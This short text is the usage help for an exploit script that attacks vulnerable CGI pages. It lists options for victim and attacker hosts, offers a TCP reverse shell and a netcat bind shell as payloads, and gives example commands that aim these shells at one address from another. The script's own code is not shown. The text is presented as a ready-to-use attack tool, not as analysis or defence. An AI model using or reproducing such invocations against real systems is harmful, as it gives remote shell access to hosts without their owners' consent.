
### Usage:
    ./exploit.py var=<value>

### Vars:
    rhost: victim host
    rport: victim port for TCP shell binding
    lhost: attacker host for TCP shell reversing
    lport: attacker port for TCP shell reversing
    pages: specific cgi vulnerable pages (separated by comma)
    proxy: host:port proxy

### Payloads:
    "reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
    "bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

### Example:
    ./exploit.py payload=reverse rhost=10.0.9.4 lhost=10.0.9.15 lport=1234
    ./exploit.py payload=bind rhost=10.0.9.4 rport=1234
